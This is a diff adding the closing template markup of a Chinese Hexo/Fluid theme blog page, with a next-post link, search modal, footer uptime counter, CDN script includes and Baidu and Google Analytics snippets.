+                                                                        <span class="hidden-mobile">upload-lab靶场通关记录</span>
+                                                                        <span class="visible-mobile">下一篇</span>
+                                                                        <i class="iconfont icon-arrowright"></i>
+                                                                    </a>
+                                                                    
+                                                        </article>
+                                                    </div>
+                                                    
+                                    </div>
+
+                                    
+                        </article>
+                    </div>
+                </div>
+            </div>
+            
+                <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+                    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+                </div>
+                
+        </div>
+    </div>
+
+    <!-- Custom -->
+    
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <div> <div class="copyright">©2020 - 2021 By Corp0ra1</div> </div> <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> &nbsp;|&nbsp; <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> &nbsp;|&nbsp; <a href="https://github.com/jsdelivr/jsdelivr" target="_blank" rel="nofollow noopener"><span>jsDelivr</span></a> </div> 
+  </div>
+  <!--添加运行时间-->
+<div id="sitetime"></div>
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* 
+      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+      year - 作为date对象的年份，为4位年份值
+      month - 0-11之间的整数，做为date对象的月份
+      day - 1-31之间的整数，做为date对象的天数
+      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+      minutes - 0-59之间的整数，做为date对象的分钟数
+      seconds - 0-59之间的整数，做为date对象的秒数
+      microseconds - 0-999之间的整数，做为date对象的毫秒数
+     */
+        var t1 = Date.UTC(2021, 05, 01, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "很高兴遇到你，我已经在此等候了你 " + /*diffYears+" 年 "+*/ diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }
+    siteTime();
+</script>
+
+    <div class="statistics">
+        
+            
+
+                
+                                                
+                                                    <!-- 不蒜子统计PV -->
+                                                    <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            
+            <span id="busuanzi_value_site_pv"></span>
+                                                     次
+                                                        &nbsp; <span class="iconfont icon-love"></span></span>
+                                                        
+
+                                                            
+
+                                                                <!-- 不蒜子统计UV -->
+                                                                <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            
+            <span id="busuanzi_value_site_uv"></span>
+                                                                 人
+                                                                    </span>
+                                                                    
+                                                                        
+    </div>
+    
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        <!-- Baidu Analytics -->
+        <script defer>
+            var _hmt = _hmt || [];
+            (function() {
+                var hm = document.createElement("script");
+                hm.src = "https://hm.baidu.com/hm.js?a1a4ccab78dfa522556928ac810fa739";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+        
+
+            
+                <!-- Google Analytics -->
+                <!-- <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-4X9XV0H0D5', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script> -->
+                <!-- Global site tag (gtag.js) - Google Analytics -->
+                <script async src="https://www.googletagmanager.com/gtag/js?G-4X9XV0H0D5"></script>
+                <script>
+                    window.dataLayer = window.dataLayer || [];
+
+                    function gtag() {
+                        dataLayer.push(arguments);
+                    }
+                    gtag('js', new Date());
+
+                    gtag('config', 'G-4X9XV0H0D5');
+                </script>
+                
+
+                    
+
+                            
+
+                                    
+
+                                            
+                                                    
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
